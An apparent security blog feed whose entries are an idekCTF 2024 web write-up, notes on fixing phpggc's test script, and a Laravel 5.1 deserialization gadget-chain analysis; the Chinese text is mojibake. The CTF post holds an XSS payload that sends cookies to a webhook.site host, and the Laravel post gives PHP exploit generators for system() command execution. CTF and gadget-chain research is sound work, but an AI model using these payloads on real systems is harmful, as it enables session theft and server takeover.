<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://fallingskies22.github.io</id>
    <title>fallingskies</title>
    <updated>2024-08-20T10:45:10.398Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://fallingskies22.github.io"/>
    <link rel="self" href="https://fallingskies22.github.io/atom.xml"/>
    <subtitle>&lt;h3&gt;æƒ³è¦å»æœˆçƒ&lt;h3&gt;</subtitle>
    <logo>https://fallingskies22.github.io/images/avatar.png</logo>
    <icon>https://fallingskies22.github.io/favicon.ico</icon>
    <rights>All rights reserved 2024, fallingskies</rights>
    <entry>
        <title type="html"><![CDATA[idekCTF 2024 - Web]]></title>
        <id>https://fallingskies22.github.io/post/idekctf-2024-web/</id>
        <link href="https://fallingskies22.github.io/post/idekctf-2024-web/">
        </link>
        <updated>2024-08-19T16:34:34.000Z</updated>
        <content type="html"><![CDATA[<h2 id="hello">hello</h2>
<p>ç»•è¿‡ç©ºæ ¼è¿‡æ»¤</p>
<pre><code>%09 /t æ°´å¹³å®šä½ç¬¦å·å³tab
%0a /n æ¢è¡Œé”®
%0c æ¢é¡µç¬¦
%0d /r CR(å­—ç¬¦)
</code></pre>
<pre><code>&lt;img%0Csrc=1%0Conerror=eval(String.fromCharCode())%0c&gt;
</code></pre>
<p>Cookieè®¾ç½®äº†httponlyï¼Œä¸èƒ½ç”¨document.cookieè·å–<br>
è€ƒè™‘ä½¿ç”¨phpinfoé¡µé¢æ¥æå–cookieä¿¡æ¯ã€‚</p>
<p>ä½†æ˜¯info.phpåªå…è®¸æœ¬åœ°è®¿é—®ã€‚</p>
<p>æ ¹æ®nginxé…ç½®æ–‡ä»¶</p>
<pre><code class="language-nginx">user www-data;
worker_processes  1;

events {
    worker_connections  1024;
}

http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;

    sendfile        on;
    keepalive_timeout  65;

    server {
        listen       80;
        server_name  localhost;

        location / {
            root   /usr/share/nginx/html;
            index  index.php index.html index.htm;
        }

        location = /info.php {
        allow 127.0.0.1;
        deny all;
        }

        location ~ \.php$ {
        root           /usr/share/nginx/html;
        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
        include fastcgi_params;  
        fastcgi_pass unix:/var/run/php/php8.2-fpm.sock;
        }

    }
}
</code></pre>
<p>ä½¿ç”¨<code>info.php/index.php</code>æ¥ç»•è¿‡é™åˆ¶<br>
å‚è€ƒ<a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-nginx-acl-rules-with-php-fpm-integration">æ–‡ç« </a><br>
åœ¨phpä¸­ä¼šæ— è§†ç¬¬äºŒä¸ªphpæ–‡ä»¶ï¼ŒæŒ‡å‘ç¬¬ä¸€ä¸ªphpæ–‡ä»¶ã€‚<br>
åŒæ—¶è¿™ä¸ªè·¯å¾„åˆä¼šç»•è¿‡nginxçš„æ ¡éªŒã€‚</p>
<p>ä½¿ç”¨XMLHttpRequestå¦‚ä¸‹æ ¼å¼</p>
<pre><code>var req = new XMLHttpRequest();
req.onload = reqListener;
var url = 'http://idek-hello.chal.idek.team:1337/info.php';
req.withCredentials = true;
req.open('GET', url, false);
req.send();

function reqListener() {
var req2 = new XMLHttpRequest();
const sess = this.responseText.substring(this.responseText.indexOf('HTTP_COOKIE') + 1 );
req2.open('GET', 'https://webhook.site/20962f32-4225-456a-83fb-769d5c10a23d/?data=' + btoa(sess), false);
req2.send()
};
</code></pre>
<p>ä½¿ç”¨cyberchefè¿›è¡Œç¼–ç </p>
<pre><code>http://idek-hello.chal.idek.team:1337/?name=%3Cimg%0Csrc=1%0Conerror=eval(String.fromCharCode(0x76,0x61,.....))%3E
</code></pre>
<p>ä½¿ç”¨fetch</p>
<pre><code>fetch(&quot;/info.php/index.php&quot;).then(response =&gt; response.text()).then(data =&gt; fetch(&quot;https://webhook.site/20962f32-4225-456a-83fb-769d5c10a23d/?data=&quot;+btoa(data.substring(data.indexOf(&quot;HTTP_COOKIE&quot;),data.indexOf(&quot;HTTP_COOKIE&quot;)+100)))
</code></pre>
<p>payload</p>
<pre><code>&lt;svg%0Conload=eval(atob(&quot;ZmV0Y2goIi9pbmZvLnBocC9pbmRleC5waHAiKS50aGVuKHJlc3BvbnNlID0%2BIHJlc3BvbnNlLnRleHQoKSkudGhlbihkYXRhID0%2BIGZldGNoKCJodHRwczovL3dlYmhvb2suc2l0ZS8yMDk2MmYzMi00MjI1LTQ1NmEtODNmYi03NjlkNWMxMGEyM2QvP2RhdGE9IitidG9hKGRhdGEuc3Vic3RyaW5nKGRhdGEuaW5kZXhPZigiSFRUUF9DT09LSUUiKSxkYXRhLmluZGV4T2YoIkhUVFBfQ09PS0lFIikrMTAwKSkpKQ%3D%3D&quot;))&gt;
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[phpgcä¿®æ”¹test-gc-compatibility.py]]></title>
        <id>https://fallingskies22.github.io/post/phpgc-xiu-gai-test-gc-compatibilitypy/</id>
        <link href="https://fallingskies22.github.io/post/phpgc-xiu-gai-test-gc-compatibilitypy/">
        </link>
        <updated>2024-08-19T05:19:20.000Z</updated>
        <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2>
<p>åœ¨æœ¬åœ°è·‘èµ·æ¥ä¸€å †é—®é¢˜ã€‚</p>
<h2 id="è¿‡ç¨‹">è¿‡ç¨‹</h2>
<p>è®¾ç½®ç¯å¢ƒå˜é‡</p>
<pre><code>COMPOSER_PATH=C:\Users\24217\AppData\Local\ComposerSetup\bin\composer.phar
</code></pre>
<p>PHPç¯å¢ƒå˜é‡ä¸€èˆ¬å®‰è£…éƒ½è‡ªå¸¦äº†ã€‚</p>
<p>æ·»åŠ å¼‚å¸¸å¤„ç†ï¼Œä¸ç„¶è¿è¡Œä¼šç›´æ¥oserroré€€å‡ºäº†</p>
<pre><code class="language-python">        try:
            if self._try_run_command(php_file):
                return (php_file,)
        except OSError:
            if path.exists() and self._try_run_command(self._php_path, php_file):
                return (self._php_path, php_file)
        
</code></pre>
<p>è¿™é‡Œå¯ä»¥åŠ ä¸€ä¸ªprintï¼Œæ–¹ä¾¿è°ƒè¯•ã€‚</p>
<pre><code class="language-python">    def _run(self, *args):
        &quot;&quot;&quot;Runs a program with given arguments.&quot;&quot;&quot;
        print(&quot;this is args:&quot;)
        print(args)
        return subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
</code></pre>
<p><code>test_payload.php</code>,ç»™ç¬¬ä¸€ä¸ªå‚æ•°<code>PHP_BINARY</code>åŠ ä¸€ä¸‹å¼•å·ï¼Œä¸ç„¶è·¯å¾„ä¸­å¦‚æœæœ‰ç©ºæ ¼ä¼šæŠ¥é”™ã€‚</p>
<pre><code class="language-php">$output = shell_exec(
            '&quot;'.PHP_BINARY.'&quot;' . ' ' .
            escapeshellarg(DIR_LIB . '/test_payload.php') . ' ' .
            escapeshellarg($vector) . ' ' .
            escapeshellarg(base64_encode($payload))
        );
</code></pre>
<p>æµ‹è¯•æ—¶ï¼Œæœ‰æ—¶å€™ï¼ŒåŒ…ä¸‹è½½ä¸ä¸‹æ¥ï¼Œéš¾æã€‚</p>
<p>ä½¿ç”¨monologæµ‹è¯•å°±å¯ä»¥æ­£å¸¸</p>
<pre><code class="language-sh">&amp; &quot;D:/Program Files (x86)/Python/python.exe&quot; d:/git_proj/phpggc/test-gc-compatibility.py monolog/monolog:2.3.0 monolog/rce1 monolog/rce3
</code></pre>
<p>ä½†æ˜¯ä½¿ç”¨laravelæ—¶ï¼Œpackageå°±æ˜¾ç¤ºKOï¼Œã€‚ã€‚ã€‚</p>
<pre><code class="language-sh">&amp; &quot;D:/Program Files (x86)/Python/python.exe&quot; d:/git_proj/phpggc/test-gc-compatibility.py laravel/laravel:5.4.0 Laravel/RCE9
</code></pre>
<p>æ„Ÿè§‰æœ¬åœ°ç¯å¢ƒæœ‰ç‚¹ä¸å¤ªå¥½å¼„ï¼Œé¡¹ç›®ä¹Ÿæä¾›æœ‰dockerï¼Œç”¨dockerè¯•è¯•ã€‚</p>
<p>dockerå®‰è£…ä¹Ÿæœ‰é—®é¢˜ï¼Œé ï¼Œä¸æäº†ğŸ™</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Laravel5.1]ååºåˆ—åŒ–é“¾åˆ†æ]]></title>
        <id>https://fallingskies22.github.io/post/laravel51fan-xu-lie-hua-lian-fen-xi/</id>
        <link href="https://fallingskies22.github.io/post/laravel51fan-xu-lie-hua-lian-fen-xi/">
        </link>
        <updated>2024-08-18T10:10:38.000Z</updated>
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒæ­å»º">ç¯å¢ƒæ­å»º</h2>
<p>ä¸‹è½½æºç åœ°å€ï¼šhttps://github.com/laravel/laravel/releases/tag/v5.1.0</p>
<p>githubä¸Šçš„æºç ä¼šç¼ºå°‘venderç›®å½•</p>
<p>ä½¿ç”¨composerä¸‹è½½åï¼Œå°†venderç›®å½•æ‹·è´åˆ°æºç ä¸­</p>
<pre><code class="language-sh">composer create-project --prefer-dist laravel/laravel laravel5.1 &quot;5.1.*&quot;
</code></pre>
<p>PHPç‰ˆæœ¬ï¼š<code>7.3.22</code></p>
<p>å°†<code>.env.example</code>ä¸­å†…å®¹å¤åˆ¶åˆ°æ–°å»ºçš„<code>.env</code>ä¸­<br>
è®¾ç½®<code>APP_ENV=local</code></p>
<p>è¿™æ ·é¡µé¢ä¼šæ˜¾ç¤ºæŠ¥é”™ä¿¡æ¯ã€‚</p>
<p>ä¿®æ”¹iniæ–‡ä»¶ï¼Œæ‰“å¼€openssl extension</p>
<pre><code>extension_dir = &quot;ext&quot;
extension=openssl
</code></pre>
<h2 id="å…¥å£å¤„">å…¥å£å¤„</h2>
<p>ä½¿ç”¨<code>app/Http/routes.php</code>ç¼–å†™å…¥å£</p>
<pre><code class="language-php">&lt;?php
Route::get('admin/{obj}',function($s){
    if($s){
        unserialize(base64_decode($s));
        return 'unserialize done'.$s;
    }else{
        return 'unserialize error'.$s;
    }
});
</code></pre>
<h2 id="rce1åˆ†æ">RCE1åˆ†æ</h2>
<p>å…ˆå…¨å±€æœç´¢<code>function __destruct()</code><br>
æ‰¾åˆ°<code>vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php</code></p>
<pre><code class="language-php">&lt;?php
public function __destruct()
    {
        foreach ($this-&gt;_keys as $nsKey =&gt; $null) {
            $this-&gt;clearAll($nsKey);
        }
    }
</code></pre>
<p>æ¯æ¬¡è¿­ä»£ä¸­ï¼Œ<code>$nsKey</code>å˜é‡ä¼šè¢«èµ‹å€¼ä¸º<code>$this-&gt;_keys</code>çš„é”®ï¼Œè€Œ<code>$null</code>å˜é‡åœ¨è¿™ä¸ªä¸Šä¸‹æ–‡ä¸­å®é™…ä¸Šæ˜¯æœªä½¿ç”¨çš„ã€‚</p>
<p>ç»§ç»­è·Ÿè¿›<code>clearAll()</code>å‡½æ•°ï¼Œ<code>is_file()</code>å’Œ<code>is_dir()</code>å‡½æ•°éƒ½ä¼šå°†å‚æ•°å½“ä½œstringè¿›è¡Œæ‹¼æ¥å¤„ç†ï¼Œå› ä¸º<code>$this-&gt;_path</code>å¯æ§ï¼Œå¯ä»¥è§¦å‘å…¶ä»–ç±»çš„<code>__toString()</code>æ–¹æ³•</p>
<p>è¿™é‡Œçš„<code>$this-&gt;_keys</code>æ˜¯ä¸€ä¸ªäºŒé‡æ•°ç»„ï¼Œå¦‚ä¸‹æ‰€ç¤º</p>
<pre><code>[1,[1,1]],[2,[2,2]],...
</code></pre>
<p>è¿™é‡Œå› ä¸ºä¼šä½¿ç”¨<code>unlink</code>åˆ é™¤æ–‡ä»¶ï¼Œåœ¨æ„é€ _keysçš„å†…å®¹æ—¶ï¼Œå†™ç‰¹æ®Šä¸€ç‚¹ï¼Œä»¥é˜²åˆ æ‰æœåŠ¡å™¨æ–‡ä»¶ã€‚</p>
<pre><code class="language-php">&lt;?php
    /**
     * Check if the given $itemKey exists in the namespace $nsKey.
     *
     * @param string $nsKey
     * @param string $itemKey
     *
     * @return bool
     */
    public function hasKey($nsKey, $itemKey)
    {
        return is_file($this-&gt;_path.'/'.$nsKey.'/'.$itemKey);
    }

    /**
     * Clear data for $itemKey in the namespace $nsKey if it exists.
     *
     * @param string $nsKey
     * @param string $itemKey
     */
    public function clearKey($nsKey, $itemKey)
    {
        if ($this-&gt;hasKey($nsKey, $itemKey)) {
            $this-&gt;_freeHandle($nsKey, $itemKey);
            unlink($this-&gt;_path.'/'.$nsKey.'/'.$itemKey);
        }
    }
    /**
     * Clear all data in the namespace $nsKey if it exists.
     *
     * @param string $nsKey
     */
    public function clearAll($nsKey)
    {
        if (array_key_exists($nsKey, $this-&gt;_keys)) {
            foreach ($this-&gt;_keys[$nsKey] as $itemKey =&gt; $null) {
                $this-&gt;clearKey($nsKey, $itemKey);
            }
            if (is_dir($this-&gt;_path.'/'.$nsKey)) {
                rmdir($this-&gt;_path.'/'.$nsKey);
            }
            unset($this-&gt;_keys[$nsKey]);
        }
    }
</code></pre>
<p>ä¸‹ä¸€æ­¥å¯»æ‰¾å¯åˆ©ç”¨<code>__toString()</code>å‡½æ•°çš„ç±»</p>
<p>è¿™é‡Œå¯ä»¥é€‰æ‹©<code>vendor/mockery/mockery/library/Mockery/Generator/DefinedTargetClass.php</code>ä¸­çš„<code>__toString()</code>æ–¹æ³•ä½œä¸ºè§¦å‘çš„ç‚¹ï¼Œå…¶å…ˆä¼šè°ƒç”¨<code>getName()</code>æ–¹æ³•ï¼Œä¸”è¯¥æ–¹æ³•ä¸­çš„<code>$this-&gt;rfc</code>æ˜¯å¯æ§çš„ï¼Œå› æ­¤å¯ä»¥æ¥è§¦å‘ä¸€ä¸ªæ²¡æœ‰<code>getName()</code>æ–¹æ³•çš„ç±»ä»è€Œæ¥è§¦å‘è¯¥ç±»ä¸­çš„<code>__call()</code>æ–¹æ³•</p>
<pre><code class="language-php">&lt;?php

namespace Mockery\Generator;

class DefinedTargetClass
{
    private $rfc;

    public function __construct(\ReflectionClass $rfc)
    {
        $this-&gt;rfc = $rfc;
    }
...
    public function getName()
    {
        return $this-&gt;rfc-&gt;getName();
    }
...
    public function __toString()
    {
        return $this-&gt;getName();
    }
...
</code></pre>
<p>å…¨å±€æœç´¢<code>__call()</code>æ–¹æ³•,è·Ÿè¿›<code>vendor/fzaninotto/faker/src/Faker/ValidGenerator.php</code>ä¸­çš„<code>__call()</code>æ–¹æ³•ï¼Œå…¶ while è¯­å¥å†…çš„<code>$this-&gt;validator</code>æ˜¯å¯æ§çš„ï¼Œå½“<code>$res</code>èƒ½å¤Ÿæ˜¯å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„å‚æ•°æ—¶å³å¯è§¦å‘å‘½ä»¤æ‰§è¡Œ RCEï¼Œç”±äº<code>$this-&gt;generator</code>ä¹Ÿæ˜¯å¯æ§çš„ï¼Œå› æ­¤å¯ä»¥å¯»æ‰¾ä¸€ä¸ªèƒ½å¤Ÿæœ‰è¿”å›å‚æ•°å€¼çš„æ–¹æ³•ç±»æ¥è¾¾åˆ°è¿”å›å‘½ä»¤æ‰§è¡Œå‡½æ•°å‚æ•°çš„ç›®çš„ä»è€Œ RCE</p>
<p><code>call_user_func()</code>å‡½æ•°åªä¼šè¿”å›<code>NULL</code>,æ‰€ä»¥ä¼šä¸€ç›´å¾ªç¯ã€‚è®¾ç½®<code>$this-&gt;maxRetries</code>æ¥é™åˆ¶å¾ªç¯æ¬¡æ•°ã€‚</p>
<p><a href="https://www.php.net/manual/en/function.call-user-func-array.php"><code>call_user_func_array()</code>å‡½æ•°ä½¿ç”¨å‚è€ƒ</a></p>
<pre><code class="language-php">&lt;?php
    /**
     * Catch and proxy all generator calls with arguments but return only valid values
     * @param string $name
     * @param array $arguments
     *
     * @return mixed
     */
    public function __call($name, $arguments)
    {
        $i = 0;
        do {
            $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);
            $i++;
            if ($i &gt; $this-&gt;maxRetries) {
                throw new \OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this-&gt;maxRetries));
            }
        } while (!call_user_func($this-&gt;validator, $res));

        return $res;
    }
</code></pre>
<p>è¿™é‡Œå¯ä»¥ç”¨<code>vendor/fzaninotto/faker/src/Faker/DefaultGenerator.php</code>æ¥åšè§¦å‘ç‚¹ï¼Œå½“å‰é¢è®¾ç½®çš„<code>$name</code>æ–¹æ³•ä¸å­˜åœ¨æ—¶è¿™é‡Œå°±ä¼šè§¦å‘åˆ°<code>__call()</code>æ–¹æ³•ï¼Œä»è€Œè¿”å›å¯æ§å‚æ•°<code>$this-&gt;default</code>çš„å€¼ï¼Œè¿™æ ·å°±å¯ä»¥æ§åˆ¶<code>$res</code>å‚æ•°äº†ã€‚</p>
<pre><code class="language-php">&lt;?php

namespace Faker;

/**
 * This generator returns a default value for all called properties
 * and methods. It works with Faker\Generator\Base-&gt;optional().
 */
class DefaultGenerator
{
    protected $default;

    public function __construct($default = null)
    {
        $this-&gt;default = $default;
    }

    /**
     * @param string $attribute
     *
     * @return mixed
     */
    public function __get($attribute)
    {
        return $this-&gt;default;
    }

    /**
     * @param string $method
     * @param array $attributes
     *
     * @return mixed
     */
    public function __call($method, $attributes)
    {
        return $this-&gt;default;
    }
}
</code></pre>
<h2 id="exp">exp</h2>
<pre><code class="language-php">&lt;?php
namespace Faker{
    class DefaultGenerator{
        protected $default;
        public function __construct($cmd)
        {
            $this-&gt;default = $cmd;
        }
    }
    class ValidGenerator
    {
        protected $generator;
        protected $validator;
        protected $maxRetries;
        public function __construct($cmd){
            $this-&gt;generator=new DefaultGenerator($cmd);
            $this-&gt;maxRetries=9;
            $this-&gt;validator='system';
        }
    }
}

namespace Mockery\Generator{
    use Faker\ValidGenerator;
    class DefinedTargetClass
    {
        private $rfc;
        public function __construct($cmd)
        {
            $this-&gt;rfc=new ValidGenerator($cmd);
        }
    }
}

namespace{
    use Mockery\Generator\DefinedTargetClass;
    class Swift_KeyCache_DiskKeyCache{
        private $_keys=['fallingskies'=&gt;['fallingskies'=&gt;'fallingskies']];
        private $_path;
        public function __construct($cmd){
            $this-&gt;_path=new DefinedTargetClass($cmd);
        }
    }
    echo urlencode(base64_encode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;whoami&quot;))));
}
?&gt;
</code></pre>
<h2 id="__tostringå¤„å…¶ä»–å‡½æ•°åˆ©ç”¨">__toStringå¤„å…¶ä»–å‡½æ•°åˆ©ç”¨</h2>
<p>å¯»æ‰¾å…¶ä»–å¯åˆ©ç”¨çš„<code>__toString()</code>å‡½æ•°</p>
<p>IdenticalValueToken.php<br>
ExactValueToken.php<br>
ä¸­è²Œä¼¼å¯ä»¥åˆ©ç”¨</p>
<p>ä¸»è¦æ‰¾æœ‰ä¸¤ä¸ª<code>-&gt;</code>çš„åœ°æ–¹ï¼Œèƒ½å¤Ÿè·³åˆ°ä¸‹ä¸€æ®µ<code>_call</code>ä»£ç å¤„ã€‚</p>
<p>è¿™é‡Œç”¨<br>
<code>vendor/phpdocumentor/reflection-docblock/src/DocBlock/Tags/Deprecated.php</code></p>
<pre><code class="language-php">&lt;?php
public function __toString() : string
    {
        if ($this-&gt;description) {
            $description = $this-&gt;description-&gt;render();
        } else {
            $description = '';
        }

        $version = (string) $this-&gt;version;

        return $version . ($description !== '' ? ($version !== '' ? ' ' : '') . $description : '');
    }
</code></pre>
<h2 id="exp-2">exp</h2>
<pre><code class="language-php">&lt;?php
namespace Faker{
    class DefaultGenerator{
        protected $default;
        public function __construct($cmd)
        {
            $this-&gt;default = $cmd;
        }
    }
    class ValidGenerator
    {
        protected $generator;
        protected $validator;
        protected $maxRetries;
        public function __construct($cmd){
            $this-&gt;generator=new DefaultGenerator($cmd);
            $this-&gt;maxRetries=9;
            $this-&gt;validator='system';
        }
    }
}

namespace phpDocumentor\Reflection\DocBlock\Tags{
    use Faker\ValidGenerator;
    class Deprecated
    {
        protected $description;
        public function __construct($cmd)
        {
            $this-&gt;description=new ValidGenerator($cmd);
        }
    }
}

namespace{
    use phpDocumentor\Reflection\DocBlock\Tags\Deprecated;
    class Swift_KeyCache_DiskKeyCache{
        private $_keys=['fallingskies'=&gt;['fallingskies'=&gt;'fallingskies']];
        private $_path;
        public function __construct($cmd){
            $this-&gt;_path=new DefinedTargetClass($cmd);
        }
    }
    echo urlencode(base64_encode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;whoami&quot;))));
}
?&gt;
</code></pre>
<h2 id="__callå¤„å…¶ä»–å‡½æ•°åˆ©ç”¨">__callå¤„å…¶ä»–å‡½æ•°åˆ©ç”¨</h2>
<p>æ‰¾åˆ°<code>vendor/laravel/framework/src/Illuminate/Database/DatabaseManager.php</code><br>
è·Ÿè¿›<code>__call()</code>æ–¹æ³•ï¼Œå…¶è°ƒç”¨äº†<code>connection()</code>æ–¹æ³•ï¼Œè·Ÿè¿›å»ï¼Œè¿™é‡Œè¦è®©å…¶è¿›å…¥<code>makeConnection()</code>æ–¹æ³•ä»è€Œæ¥åˆ©ç”¨<code>call_user_func()</code>æ–¹æ³•æ¥è¿›è¡ŒRCE</p>
<pre><code class="language-php">&lt;?php

namespace Illuminate\Database;

use Illuminate\Support\Arr;
use Illuminate\Support\Str;
use InvalidArgumentException;
use Illuminate\Database\Connectors\ConnectionFactory;

class DatabaseManager implements ConnectionResolverInterface
{
    /**
     * The application instance.
     *
     * @var \Illuminate\Foundation\Application
     */
    protected $app;

    /**
     * The database connection factory instance.
     *
     * @var \Illuminate\Database\Connectors\ConnectionFactory
     */
    protected $factory;

    /**
     * The active connection instances.
     *
     * @var array
     */
    protected $connections = [];

    /**
     * The custom connection resolvers.
     *
     * @var array
     */
    protected $extensions = [];

    /**
     * Create a new database manager instance.
     *
     * @param  \Illuminate\Foundation\Application  $app
     * @param  \Illuminate\Database\Connectors\ConnectionFactory  $factory
     * @return void
     */
    public function __construct($app, ConnectionFactory $factory)
    {
        $this-&gt;app = $app;
        $this-&gt;factory = $factory;
    }

    /**
     * Get a database connection instance.
     *
     * @param  string  $name
     * @return \Illuminate\Database\Connection
     */
    public function connection($name = null)
    {
        list($name, $type) = $this-&gt;parseConnectionName($name);

        // If we haven't created this connection, we'll create it based on the config
        // provided in the application. Once we've created the connections we will
        // set the &quot;fetch mode&quot; for PDO which determines the query return types.
        if (! isset($this-&gt;connections[$name])) {
            $connection = $this-&gt;makeConnection($name);

            $this-&gt;setPdoForType($connection, $type);

            $this-&gt;connections[$name] = $this-&gt;prepare($connection);
        }

        return $this-&gt;connections[$name];
    }

    /**
     * Parse the connection into an array of the name and read / write type.
     *
     * @param  string  $name
     * @return array
     */
    protected function parseConnectionName($name)
    {
        $name = $name ?: $this-&gt;getDefaultConnection();

        return Str::endsWith($name, ['::read', '::write'])
                            ? explode('::', $name, 2) : [$name, null];
    }

    /**
     * Disconnect from the given database and remove from local cache.
     *
     * @param  string  $name
     * @return void
     */
    public function purge($name = null)
    {
        $this-&gt;disconnect($name);

        unset($this-&gt;connections[$name]);
    }

    /**
     * Disconnect from the given database.
     *
     * @param  string  $name
     * @return void
     */
    public function disconnect($name = null)
    {
        if (isset($this-&gt;connections[$name = $name ?: $this-&gt;getDefaultConnection()])) {
            $this-&gt;connections[$name]-&gt;disconnect();
        }
    }

    /**
     * Reconnect to the given database.
     *
     * @param  string  $name
     * @return \Illuminate\Database\Connection
     */
    public function reconnect($name = null)
    {
        $this-&gt;disconnect($name = $name ?: $this-&gt;getDefaultConnection());

        if (! isset($this-&gt;connections[$name])) {
            return $this-&gt;connection($name);
        }

        return $this-&gt;refreshPdoConnections($name);
    }

    /**
     * Refresh the PDO connections on a given connection.
     *
     * @param  string  $name
     * @return \Illuminate\Database\Connection
     */
    protected function refreshPdoConnections($name)
    {
        $fresh = $this-&gt;makeConnection($name);

        return $this-&gt;connections[$name]
                                -&gt;setPdo($fresh-&gt;getPdo())
                                -&gt;setReadPdo($fresh-&gt;getReadPdo());
    }

    /**
     * Make the database connection instance.
     *
     * @param  string  $name
     * @return \Illuminate\Database\Connection
     */
    protected function makeConnection($name)
    {
        $config = $this-&gt;getConfig($name);

        // First we will check by the connection name to see if an extension has been
        // registered specifically for that connection. If it has we will call the
        // Closure and pass it the config allowing it to resolve the connection.
        if (isset($this-&gt;extensions[$name])) {
            return call_user_func($this-&gt;extensions[$name], $config, $name);
        }

        $driver = $config['driver'];

        // Next we will check to see if an extension has been registered for a driver
        // and will call the Closure if so, which allows us to have a more generic
        // resolver for the drivers themselves which applies to all connections.
        if (isset($this-&gt;extensions[$driver])) {
            return call_user_func($this-&gt;extensions[$driver], $config, $name);
        }

        return $this-&gt;factory-&gt;make($config, $name);
    }

    /**
     * Prepare the database connection instance.
     *
     * @param  \Illuminate\Database\Connection  $connection
     * @return \Illuminate\Database\Connection
     */
    protected function prepare(Connection $connection)
    {
        $connection-&gt;setFetchMode($this-&gt;app['config']['database.fetch']);

        if ($this-&gt;app-&gt;bound('events')) {
            $connection-&gt;setEventDispatcher($this-&gt;app['events']);
        }

        // Here we'll set a reconnector callback. This reconnector can be any callable
        // so we will set a Closure to reconnect from this manager with the name of
        // the connection, which will allow us to reconnect from the connections.
        $connection-&gt;setReconnector(function ($connection) {
            $this-&gt;reconnect($connection-&gt;getName());
        });

        return $connection;
    }

    /**
     * Prepare the read write mode for database connection instance.
     *
     * @param  \Illuminate\Database\Connection  $connection
     * @param  string  $type
     * @return \Illuminate\Database\Connection
     */
    protected function setPdoForType(Connection $connection, $type = null)
    {
        if ($type == 'read') {
            $connection-&gt;setPdo($connection-&gt;getReadPdo());
        } elseif ($type == 'write') {
            $connection-&gt;setReadPdo($connection-&gt;getPdo());
        }

        return $connection;
    }

    /**
     * Get the configuration for a connection.
     *
     * @param  string  $name
     * @return array
     *
     * @throws \InvalidArgumentException
     */
    protected function getConfig($name)
    {
        $name = $name ?: $this-&gt;getDefaultConnection();

        // To get the database connection configuration, we will just pull each of the
        // connection configurations and get the configurations for the given name.
        // If the configuration doesn't exist, we'll throw an exception and bail.
        $connections = $this-&gt;app['config']['database.connections'];

        if (is_null($config = Arr::get($connections, $name))) {
            throw new InvalidArgumentException(&quot;Database [$name] not configured.&quot;);
        }

        return $config;
    }

    /**
     * Get the default connection name.
     *
     * @return string
     */
    public function getDefaultConnection()
    {
        return $this-&gt;app['config']['database.default'];
    }

    /**
     * Set the default connection name.
     *
     * @param  string  $name
     * @return void
     */
    public function setDefaultConnection($name)
    {
        $this-&gt;app['config']['database.default'] = $name;
    }

    /**
     * Register an extension connection resolver.
     *
     * @param  string    $name
     * @param  callable  $resolver
     * @return void
     */
    public function extend($name, callable $resolver)
    {
        $this-&gt;extensions[$name] = $resolver;
    }

    /**
     * Return all of the created connections.
     *
     * @return array
     */
    public function getConnections()
    {
        return $this-&gt;connections;
    }

    /**
     * Dynamically pass methods to the default connection.
     *
     * @param  string  $method
     * @param  array   $parameters
     * @return mixed
     */
    public function __call($method, $parameters)
    {
        return call_user_func_array([$this-&gt;connection(), $method], $parameters);
    }
}
</code></pre>
<p>è·Ÿè¿›<code>getConfig()</code>æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›<code>Arr::get($connections, $name)</code>ï¼Œå¯ä»¥çœ‹åˆ°ç»è¿‡<code>get()</code>æ–¹æ³•è¿”å›å›æ¥çš„<code>$config</code>çš„å€¼æ˜¯å¯æ§çš„ï¼Œå¯ä»¥å°†å‘½ä»¤æ‰§è¡Œå‡½æ•°è¿”å›å›æ¥ï¼Œä»è€Œå¯¼è‡´ RCE</p>
<p>éœ€è¦å°†<code>$this-&gt;extensions[$name]</code>èµ‹å€¼ä¸º<code>call_user_func</code>ï¼Œ<code>$config</code>èµ‹å€¼ä¸º<code>system</code>,<code>$name</code>èµ‹å€¼ä¸º<code>id</code>(å³$payload)</p>
<p>å¾€ä¸ŠæŸ¥çœ‹<code>$name</code>å‚æ•°ä¼ é€’è¿‡ç¨‹</p>
<pre><code>list($name, $type) = $this-&gt;parseConnectionName($name);
</code></pre>
<p>ç»§ç»­è·Ÿè¿›<code>parseConnectionName()</code>å‡½æ•°</p>
<pre><code>protected function parseConnectionName($name)
    {
        $name = $name ?: $this-&gt;getDefaultConnection();

        return Str::endsWith($name, ['::read', '::write'])
                            ? explode('::', $name, 2) : [$name, null];
    }
</code></pre>
<p>ç»§ç»­è·Ÿè¿›<code>getDefaultConnection()</code>å‡½æ•°</p>
<pre><code>public function getDefaultConnection()
    {
        return $this-&gt;app['config']['database.default'];
    }
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ç›´æ¥èµ‹å€¼<code>$this-&gt;app['config']['database.default']=$payload</code>å°±å¯ä»¥äº†,ä¸Šä¸€ä¸ªå‡½æ•°å¯¹<code>::</code>è¿›è¡Œåˆ†å‰²ï¼Œæ‰€ä»¥è®¾ç½®å‚æ•°æ—¶ä¹Ÿå¯ä»¥åŠ <code>::</code>,è™½ç„¶æ²¡å•¥ç”¨ğŸ˜…</p>
<p>ç»§ç»­çœ‹<code>$config</code>å‚æ•°</p>
<pre><code>$config = $this-&gt;getConfig($name);
</code></pre>
<p>è·Ÿè¿›<code>getConfig()</code>å‡½æ•°</p>
<pre><code>protected function getConfig($name)
    {
        $name = $name ?: $this-&gt;getDefaultConnection();

        // To get the database connection configuration, we will just pull each of the
        // connection configurations and get the configurations for the given name.
        // If the configuration doesn't exist, we'll throw an exception and bail.
        $connections = $this-&gt;app['config']['database.connections'];

        if (is_null($config = Arr::get($connections, $name))) {
            throw new InvalidArgumentException(&quot;Database [$name] not configured.&quot;);
        }

        return $config;
    }
